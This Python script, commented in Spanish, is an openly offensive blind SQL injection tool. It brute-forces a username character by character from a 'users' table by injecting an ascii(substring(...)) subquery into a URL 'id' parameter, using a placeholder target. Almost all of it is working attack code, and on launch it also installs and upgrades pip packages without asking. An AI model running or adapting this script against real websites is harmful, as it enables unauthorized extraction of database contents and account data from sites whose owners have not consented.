#!/usr/bin/env python3

# Este programa realiza un ataque de inyección SQL ciega (Blind SQL Injection) para extraer información
# de una base de datos. Utiliza fuerza bruta para descubrir los caracteres de un nombre de usuario
# almacenado en la base de datos objetivo. Además, verifica e instala automáticamente las bibliotecas
# necesarias antes de ejecutar el ataque.

# Importa las bibliotecas necesarias
import sys
import signal
import string
import time
import requests
from pwn import * 
import subprocess
import pkg_resources

# Función para verificar e instalar las bibliotecas necesarias
def check_and_install_libraries():
    # Lista de bibliotecas requeridas
    required_libraries = ['requests', 'pwn']  # Agrega todas las bibliotecas necesarias aquí
    
    for library in required_libraries:
        try:
            # Verifica si la biblioteca está instalada
            pkg_resources.get_distribution(library)
        except pkg_resources.DistributionNotFound:
            # Si no está instalada, la instala
            print(f"{library} no encontrada. Instalando...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        else:
            # Si está instalada, verifica si hay actualizaciones
            print(f"Verificando actualizaciones: {library}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", library])
    
    print("Todas las bibliotecas requeridas están instaladas y actualizadas.")

# Ejecuta la verificación antes de ejecutar el script principal
check_and_install_libraries()

# Función para manejar la interrupción Ctrl+C
def def_handler(sig, frame):
    """
    Maneja la interrupción Ctrl+C
    """
    print("\n\n[!] Saliendo...")
    sys.exit(1)

# Configura el manejador para Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
MAIN_URL = "http://test.com/"  # URL objetivo para la inyección SQL
CHARACTERS = string.printable  # Conjunto de caracteres imprimibles

# Función principal para realizar la inyección SQL
def make_sqli():
    """
    Realiza un ataque de inyección SQL para extraer información del usuario
    """
    # Inicializa el progreso de fuerza bruta
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando el proceso de fuerza bruta")

    time.sleep(2)

    # Inicializa el progreso de datos extraídos
    p2 = log.progress("Datos extraídos")
    extracted_info = ""

    # Itera sobre las posiciones de los caracteres en el nombre de usuario
    for position in range(1, 150):
        # Itera sobre los caracteres posibles
        for character in range(33, 126):
            # Construye la URL de inyección SQL
            sqli_url = f"{MAIN_URL}?id=9 or (select(select ascii(substring(username,{position},1)) from users where id = 1) = {character})"

            # Actualiza el estado del progreso
            p1.status(sqli_url)
            
            try:
                # Envía la solicitud HTTP
                r = requests.get(sqli_url, timeout=10)
                
                # Si la respuesta es exitosa, agrega el carácter extraído
                if r.status_code == 200:
                    extracted_info += chr(character)
                    p2.status(extracted_info)
                    break
            except requests.RequestException as e:
                # Maneja errores en la solicitud
                log.error(f"Fallo en la solicitud: {e}")
                continue

    # Marca el progreso como completado
    p1.success("Fuerza bruta completada")
    p2.success(f"Datos extraídos finales: {extracted_info}")

# Punto de entrada del script
if __name__ == '__main__':
    make_sqli()
